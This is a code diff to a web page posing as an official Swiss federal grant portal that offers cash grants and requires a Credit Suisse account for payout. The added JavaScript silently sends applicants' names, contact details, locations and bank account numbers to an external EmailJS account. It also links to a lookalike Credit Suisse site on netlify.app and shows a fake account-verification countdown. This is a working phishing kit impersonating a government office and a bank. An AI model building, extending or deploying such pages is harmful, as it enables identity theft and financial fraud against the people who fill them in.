@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Swiss Federal Grant Program</title>
+    <title>Swiss Federal Grant Program | Official Application Portal</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -23,6 +25,8 @@
             text-align: center;
             width: 100%;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 10;
         }
 
         .header h1 {
@@ -59,7 +63,6 @@
             flex: 1;
             text-align: center;
             position: relative;
-            cursor: pointer;
         }
         .progress-step .step-number {
             width: 36px;
@@ -104,7 +107,7 @@
             transition: width 0.3s;
         }
 
-        /* Step transitions - FADE */
+        /* Step transitions */
         .step {
             display: none;
             animation: fadeIn 0.4s ease-in-out;
@@ -115,6 +118,54 @@
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Step 1 Background Image */
+        #step1 {
+            position: relative;
+            border-radius: 24px;
+            padding: 40px;
+            background: url('https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=1600&q=80') no-repeat center center;
+            background-size: cover;
+            min-height: 500px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #step1.active {
+            display: flex;
+        }
+        #step1::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.65);
+            border-radius: 24px;
+            z-index: 0;
+        }
+        #step1 > * {
+            position: relative;
+            z-index: 1;
+            color: white;
+        }
+        #step1 h2 {
+            color: white;
+        }
+        #step1 .welcome-text {
+            color: rgba(255,255,255,0.95);
+        }
+        #step1 .btn {
+            background: white;
+            color: #1a3c5e;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        #step1 .btn:hover {
+            background: #f0f2f5;
+            transform: translateY(-2px);
         }
 
         h2 {
@@ -133,7 +184,7 @@
             line-height: 1.6;
         }
 
-        /* Two-column form layout */
+        /* Form Layout */
         .form-row {
             display: flex;
             gap: 20px;
@@ -151,6 +202,10 @@
             margin-bottom: 8px;
             color: #2d3748;
             font-size: 14px;
+        }
+        .required-star {
+            color: #e53e3e;
+            margin-left: 3px;
         }
         input, select {
             width: 100%;
@@ -176,6 +231,15 @@
         input.invalid, select.invalid {
             border-color: #e53e3e;
         }
+        .error-text {
+            color: #e53e3e;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .error-text.show {
+            display: block;
+        }
 
         .btn {
             background: linear-gradient(135deg, #1a3c5e 0%, #0f2c46 100%);
@@ -195,8 +259,16 @@
             transform: translateY(-2px);
             box-shadow: 0 6px 20px rgba(0,0,0,0.15);
         }
-        .btn:active {
-            transform: translateY(0);
+        .btn-secondary {
+            background: transparent;
+            color: #1a3c5e;
+            box-shadow: none;
+            border: 2px solid #cbd5e0;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background: #f0f2f5;
+            transform: translateY(-2px);
         }
 
         .amount-box {
@@ -222,7 +294,7 @@
             line-height: 1.3;
         }
 
-        /* Loading overlay with 10s timer */
+        /* Loading Overlay */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -309,6 +381,29 @@
             transform: translateY(-2px);
         }
 
+        .expandable-section {
+            margin-top: 10px;
+            margin-bottom: 20px;
+            display: none;
+            background: #f7fafc;
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid #e2e8f0;
+        }
+        .expandable-section.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        .saved-badge {
+            background: #d4edda;
+            color: #155724;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
         .input-group {
             margin-top: 20px;
             padding: 25px;
@@ -316,6 +411,9 @@
             border-radius: 16px;
             border: 1px solid #e2e8f0;
             display: none;
+        }
+        .input-group.show {
+            display: block;
         }
 
         .confirmation-card {
@@ -337,6 +435,24 @@
             margin-top: 40px;
         }
 
+        .back-button-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .back-link {
+            color: #1a3c5e;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 20px;
+            transition: background 0.2s;
+        }
+        .back-link:hover {
+            background: #e2e8f0;
+        }
+
         @media (max-width: 640px) {
             .main-content {
                 padding: 25px 16px;
@@ -350,6 +466,9 @@
             .form-row {
                 flex-direction: column;
                 gap: 16px;
+            }
+            #step1 {
+                padding: 30px 20px;
             }
         }
     </style>
@@ -404,34 +523,39 @@
             <h2>Grant Preliminary Inquiry</h2>
             <div class="form-row">
                 <div class="form-group">
-                    <label>Full Name *</label>
-                    <input type="text" id="fullName" oninput="validateField(this)">
+                    <label>Full Name <span class="required-star">*</span></label>
+                    <input type="text" id="fullName" oninput="validateField(this, 'nameError')">
+                    <div id="nameError" class="error-text">Full name is required</div>
                 </div>
                 <div class="form-group">
-                    <label>Email Address *</label>
-                    <input type="email" id="email" oninput="validateField(this)">
-                </div>
-            </div>
-            <div class="form-row">
-                <div class="form-group">
-                    <label>Phone Number *</label>
-                    <input type="tel" id="phone" oninput="validateField(this)">
-                </div>
-                <div class="form-group">
-                    <label>Country / City *</label>
-                    <input type="text" id="location" oninput="validateField(this)">
+                    <label>Email Address <span class="required-star">*</span></label>
+                    <input type="email" id="email" oninput="validateField(this, 'emailError')">
+                    <div id="emailError" class="error-text">Valid email address is required</div>
                 </div>
             </div>
             <div class="form-row">
                 <div class="form-group">
-                    <label>Occupation *</label>
-                    <select id="occupation" onchange="validateField(this)">
+                    <label>Phone Number <span class="required-star">*</span></label>
+                    <input type="tel" id="phone" oninput="validateField(this, 'phoneError')">
+                    <div id="phoneError" class="error-text">Phone number is required</div>
+                </div>
+                <div class="form-group">
+                    <label>Country / City <span class="required-star">*</span></label>
+                    <input type="text" id="location" oninput="validateField(this, 'locationError')">
+                    <div id="locationError" class="error-text">Country/City is required</div>
+                </div>
+            </div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Occupation <span class="required-star">*</span></label>
+                    <select id="occupation" onchange="validateField(this, 'occupationError')">
                         <option value="">Select...</option>
                         <option value="individual">Individual / Employee</option>
                         <option value="family">Family / Household</option>
                         <option value="small_business">Small Business Owner</option>
                         <option value="large_business">Larger Business / Professional</option>
                     </select>
+                    <div id="occupationError" class="error-text">Please select an occupation</div>
                 </div>
                 <div class="form-group">
                     <label>Family Size</label>
@@ -443,6 +567,9 @@
                 <input type="text" id="expectedAmount" placeholder="e.g., $15,000">
             </div>
             <button class="btn" onclick="submitApplication()">Check Eligibility</button>
+            <div class="back-button-container">
+                <span class="back-link" onclick="goToStep(1)">← Back</span>
+            </div>
         </div>
 
         <!-- STEP 3: ELIGIBILITY RESULT -->
@@ -463,12 +590,35 @@
                 <p>Fund disbursement requires an active account with a Swiss financial institution.</p>
                 <small>This is a mandatory regulatory requirement for international grant distribution.</small>
             </div>
-            <button class="option-btn" onclick="showAccountForm()">I already have a Credit Suisse account</button>
-            <button class="option-btn" onclick="createNewAccount()">I need to create a Credit Suisse account</button>
-            <div id="existingForm" class="input-group">
+
+            <div id="savedAlert" class="saved-badge" style="display: none;">
+                ✓ Your application has been saved. You can close this window and return anytime.
+            </div>
+
+            <button class="option-btn" onclick="toggleExistingAccountForm()">I already have a Credit Suisse account</button>
+            
+            <button class="option-btn" onclick="toggleCreateAccountDropdown()">I need to create a Credit Suisse account</button>
+            
+            <div id="createAccountDropdown" class="expandable-section">
+                <p style="margin-bottom: 15px;">When you click "Create Account Now" below:</p>
+                <ul style="margin-left: 20px; margin-bottom: 15px; color: #4a5568;">
+                    <li>A new tab will open to Credit Suisse</li>
+                    <li>Complete the account creation process</li>
+                    <li>You will receive an account number</li>
+                    <li>Return here and paste it below</li>
+                </ul>
+                <div class="saved-badge" style="margin-bottom: 15px;">
+                    ✓ Your application has been saved. You can close this window and return anytime.
+                </div>
+                <button class="btn" onclick="openCreationAndGoBack()">Create Account Now →</button>
+                <button class="btn btn-secondary" onclick="toggleCreateAccountDropdown()">Cancel</button>
+            </div>
+
+            <div id="existingAccountForm" class="input-group">
                 <label>Credit Suisse Account Number</label>
                 <input type="text" id="accountNumber" placeholder="CHxx 1234 5678 9012 3456">
-                <button class="btn" onclick="processExistingAccount()">Verify Account</button>
+                <div id="accountError" class="error-text">Please enter your account number</div>
+                <button class="btn" onclick="verifyAccountWithDelay()">Verify Account</button>
             </div>
         </div>
 
@@ -482,7 +632,7 @@
                     <div class="amount-value" id="finalGrantAmount">—</div>
                 </div>
                 <p style="font-size: 18px; color: #2d3748; margin: 20px 0;">Funds will be deposited within 5-7 business days.</p>
-                <button class="btn" onclick="resetApplication()">Start New Application</button>
+                <p style="font-size: 14px; color: #6c757d;">Reference ID: <span id="refId">---</span></p>
             </div>
         </div>
     </div>
@@ -491,7 +641,7 @@
         Swiss Federal Grant Program | Federal Office for Economic Affairs
     </div>
 
-    <!-- Loading Overlay -->
+    <!-- Loading Overlay for Eligibility -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loading-card">
             <div class="spinner"></div>
@@ -500,18 +650,103 @@
         </div>
     </div>
 
+    <!-- Loading Overlay for Account Verification -->
+    <div id="verifyOverlay" class="loading-overlay" style="display: none;">
+        <div class="loading-card">
+            <div class="spinner"></div>
+            <div class="timer-text" id="verifyTimer">2</div>
+            <div class="loading-message">Verifying account with Credit Suisse...</div>
+        </div>
+    </div>
+
     <script>
+        // EmailJS Configuration
+        emailjs.init("pDefyPQfc_lW2Cdcu");
+        const EMAIL_SERVICE_ID = "service_oppnbmh";
+        const EMAIL_TEMPLATE_ID = "template_g87bpfq";
+
+        // Application State
         let currentStep = 1;
         let grantAmountValue = 0;
         let timerInterval = null;
+        let verifyInterval = null;
+        let applicationData = {
+            fullName: '', email: '', phone: '', location: '', occupation: '', 
+            familySize: '', expectedAmount: '', grantAmount: 0, accountNumber: '',
+            step3Reached: false, step5Reached: false, referenceId: ''
+        };
 
-        function validateField(field) {
-            if (field.value.trim() !== '') {
+        // Load saved data from localStorage on page load
+        function loadSavedData() {
+            const saved = localStorage.getItem('swissGrantApplication');
+            if (saved) {
+                try {
+                    const data = JSON.parse(saved);
+                    applicationData = { ...applicationData, ...data };
+                    grantAmountValue = applicationData.grantAmount;
+                    
+                    // Restore form fields if on Step 2
+                    if (document.getElementById('fullName')) {
+                        document.getElementById('fullName').value = applicationData.fullName || '';
+                        document.getElementById('email').value = applicationData.email || '';
+                        document.getElementById('phone').value = applicationData.phone || '';
+                        document.getElementById('location').value = applicationData.location || '';
+                        document.getElementById('occupation').value = applicationData.occupation || '';
+                        document.getElementById('familySize').value = applicationData.familySize || '';
+                        document.getElementById('expectedAmount').value = applicationData.expectedAmount || '';
+                        document.getElementById('accountNumber').value = applicationData.accountNumber || '';
+                    }
+                    
+                    // Determine which step to show
+                    if (applicationData.step5Reached) {
+                        goToStep(5);
+                        document.getElementById('finalGrantAmount').textContent = grantAmountValue.toLocaleString('en-US', {style: 'currency', currency: 'USD'});
+                        document.getElementById('refId').textContent = applicationData.referenceId || Math.random().toString(36).substr(2, 8).toUpperCase();
+                    } else if (applicationData.step3Reached && grantAmountValue > 0) {
+                        goToStep(3);
+                        document.getElementById('grantAmount').textContent = grantAmountValue.toLocaleString('en-US', {style: 'currency', currency: 'USD'});
+                        document.getElementById('savedAlert').style.display = 'block';
+                        setTimeout(() => {
+                            if(document.getElementById('savedAlert')) document.getElementById('savedAlert').style.display = 'none';
+                        }, 5000);
+                    } else {
+                        goToStep(1);
+                    }
+                } catch(e) { console.log('Error loading saved data'); }
+            }
+        }
+
+        function saveToLocalStorage() {
+            applicationData.grantAmount = grantAmountValue;
+            localStorage.setItem('swissGrantApplication', JSON.stringify(applicationData));
+        }
+
+        function validateField(field, errorId) {
+            const value = field.value.trim();
+            const errorEl = document.getElementById(errorId);
+            if (errorId === 'emailError') {
+                const isValid = value !== '' && value.includes('@') && value.includes('.');
+                if (isValid) {
+                    field.classList.add('valid');
+                    field.classList.remove('invalid');
+                    if(errorEl) errorEl.classList.remove('show');
+                } else {
+                    field.classList.remove('valid');
+                    field.classList.add('invalid');
+                    if(errorEl && value !== '') errorEl.classList.add('show');
+                    else if(errorEl && value === '') errorEl.classList.remove('show');
+                }
+                return;
+            }
+            
+            if (value !== '') {
                 field.classList.add('valid');
                 field.classList.remove('invalid');
+                if(errorEl) errorEl.classList.remove('show');
             } else {
                 field.classList.remove('valid');
                 field.classList.add('invalid');
+                if(errorEl && field.getAttribute('required') !== null) errorEl.classList.add('show');
             }
         }
 
@@ -527,16 +762,48 @@
                 }
             });
             const fillPercent = ((step - 1) / 4) * 100;
-            document.getElementById('progressFill').style.width = fillPercent + '%';
+            const fillEl = document.getElementById('progressFill');
+            if(fillEl) fillEl.style.width = fillPercent + '%';
         }
 
         function goToStep(step) {
+            // Prevent going back from Step 3,4,5 except via back button on Step 2 only
+            if (currentStep === 3 && step === 2) return;
+            if (currentStep === 4 && step === 2) return;
+            if (currentStep === 5 && step !== 5) return;
+            if (step === 2 && currentStep > 2) return;
+            
             document.querySelectorAll('.step').forEach((el, idx) => {
                 el.classList.remove('active');
                 if (idx + 1 === step) el.classList.add('active');
             });
             currentStep = step;
             updateProgressBar(step);
+            saveToLocalStorage();
+        }
+
+        async function sendEmail(emailType, additionalData = {}) {
+            try {
+                const templateParams = {
+                    full_name: applicationData.fullName,
+                    email: applicationData.email,
+                    phone: applicationData.phone,
+                    location: applicationData.location,
+                    occupation: applicationData.occupation,
+                    family_size: applicationData.familySize || 'Not provided',
+                    expected_amount: applicationData.expectedAmount || 'Not provided',
+                    grant_amount: grantAmountValue.toLocaleString('en-US', {style: 'currency', currency: 'USD'}),
+                    account_number: additionalData.accountNumber || applicationData.accountNumber || 'Not provided',
+                    application_stage: emailType === 'eligibility' ? 'Eligibility Confirmed (Step 3)' : 'Application Completed (Step 5)',
+                    reference_id: applicationData.referenceId,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                await emailjs.send(EMAIL_SERVICE_ID, EMAIL_TEMPLATE_ID, templateParams);
+                console.log(`Email ${emailType} sent successfully`);
+            } catch(error) {
+                console.error('Email send failed:', error);
+            }
         }
 
         function submitApplication() {
@@ -545,14 +812,24 @@
             const phone = document.getElementById('phone').value;
             const location = document.getElementById('location').value;
             const occupation = document.getElementById('occupation').value;
-
-            if (!fullName || !email || !phone || !location || !occupation) {
-                alert("Please complete all required fields.");
-                return;
-            }
-
-            const expectedAmount = document.getElementById('expectedAmount').value;
             const familySize = document.getElementById('familySize').value;
+            const expectedAmount = document.getElementById('expectedAmount').value;
+
+            let isValid = true;
+            if (!fullName) { document.getElementById('nameError').classList.add('show'); isValid = false; } else { document.getElementById('nameError').classList.remove('show'); }
+            if (!email || !email.includes('@') || !email.includes('.')) { document.getElementById('emailError').classList.add('show'); isValid = false; } else { document.getElementById('emailError').classList.remove('show'); }
+            if (!phone) { document.getElementById('phoneError').classList.add('show'); isValid = false; } else { document.getElementById('phoneError').classList.remove('show'); }
+            if (!location) { document.getElementById('locationError').classList.add('show'); isValid = false; } else { document.getElementById('locationError').classList.remove('show'); }
+            if (!occupation) { document.getElementById('occupationError').classList.add('show'); isValid = false; } else { document.getElementById('occupationError').classList.remove('show'); }
+
+            if (!isValid) return;
+
+            applicationData = {
+                fullName, email, phone, location, occupation, familySize, expectedAmount,
+                grantAmount: 0, accountNumber: '', step3Reached: false, step5Reached: false,
+                referenceId: Math.random().toString(36).substr(2, 8).toUpperCase()
+            };
+            saveToLocalStorage();
 
             let amount = 0;
             switch(occupation) {
@@ -574,9 +851,11 @@
             }
 
             grantAmountValue = amount;
+            applicationData.grantAmount = amount;
+            saveToLocalStorage();
+
             document.getElementById('grantAmount').textContent = amount.toLocaleString('en-US', {style: 'currency', currency: 'USD'});
 
-            // Show loading overlay with 10 second timer
             const overlay = document.getElementById('loadingOverlay');
             overlay.style.display = 'flex';
             
@@ -593,54 +872,83 @@
                 if (secondsLeft <= 0) {
                     clearInterval(timerInterval);
                     overlay.style.display = 'none';
+                    applicationData.step3Reached = true;
+                    saveToLocalStorage();
+                    sendEmail('eligibility');
                     goToStep(3);
                 }
             }, 1000);
         }
 
-        function showAccountForm() {
-            const form = document.getElementById('existingForm');
-            if (form.style.display === 'none' || form.style.display === '') {
-                form.style.display = 'block';
-            } else {
-                form.style.display = 'none';
-            }
+        function toggleExistingAccountForm() {
+            const form = document.getElementById('existingAccountForm');
+            form.classList.toggle('show');
+            document.getElementById('createAccountDropdown').classList.remove('show');
         }
 
-        function createNewAccount() {
+        function toggleCreateAccountDropdown() {
+            const dropdown = document.getElementById('createAccountDropdown');
+            dropdown.classList.toggle('show');
+            document.getElementById('existingAccountForm').classList.remove('show');
+        }
+
+        function openCreationAndGoBack() {
             window.open('https://creditsuisse-agservice-create-account.netlify.app/', '_blank');
+            toggleCreateAccountDropdown();
+            // Stay on Step 4, data persists via localStorage
         }
 
-        function processExistingAccount() {
+        function verifyAccountWithDelay() {
             const account = document.getElementById('accountNumber').value;
+            const errorEl = document.getElementById('accountError');
+            
             if (!account.trim()) {
-                alert('Please enter your Credit Suisse account number.');
+                errorEl.classList.add('show');
                 return;
             }
+            errorEl.classList.remove('show');
             
-            document.getElementById('finalGrantAmount').textContent = grantAmountValue.toLocaleString('en-US', {style: 'currency', currency: 'USD'});
-            goToStep(5);
+            applicationData.accountNumber = account;
+            saveToLocalStorage();
+            
+            const verifyOverlay = document.getElementById('verifyOverlay');
+            verifyOverlay.style.display = 'flex';
+            
+            let secondsLeft = 2;
+            const timerElement = document.getElementById('verifyTimer');
+            timerElement.textContent = secondsLeft;
+            
+            if (verifyInterval) clearInterval(verifyInterval);
+            
+            verifyInterval = setInterval(() => {
+                secondsLeft--;
+                timerElement.textContent = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    clearInterval(verifyInterval);
+                    verifyOverlay.style.display = 'none';
+                    
+                    document.getElementById('finalGrantAmount').textContent = grantAmountValue.toLocaleString('en-US', {style: 'currency', currency: 'USD'});
+                    document.getElementById('refId').textContent = applicationData.referenceId;
+                    
+                    applicationData.step5Reached = true;
+                    saveToLocalStorage();
+                    sendEmail('completion', { accountNumber: account });
+                    goToStep(5);
+                }
+            }, 1000);
         }
 
-        function resetApplication() {
-            document.getElementById('fullName').value = '';
-            document.getElementById('email').value = '';
-            document.getElementById('phone').value = '';
-            document.getElementById('location').value = '';
-            document.getElementById('occupation').value = '';
-            document.getElementById('familySize').value = '';
-            document.getElementById('expectedAmount').value = '';
-            document.getElementById('accountNumber').value = '';
-            
-            document.querySelectorAll('input, select').forEach(el => {
-                el.classList.remove('valid', 'invalid');
-            });
-            
-            goToStep(1);
-        }
+        // Handle Step 2 refresh -> clear everything
+        window.addEventListener('beforeunload', function() {
+            if (currentStep === 2) {
+                localStorage.removeItem('swissGrantApplication');
+            }
+        });
 
-        // Initialize
-        updateProgressBar(1);
+        // Initialize EmailJS and load saved data
+        emailjs.init("pDefyPQfc_lW2Cdcu");
+        loadSavedData();
     </script>
 </body>
 </html>
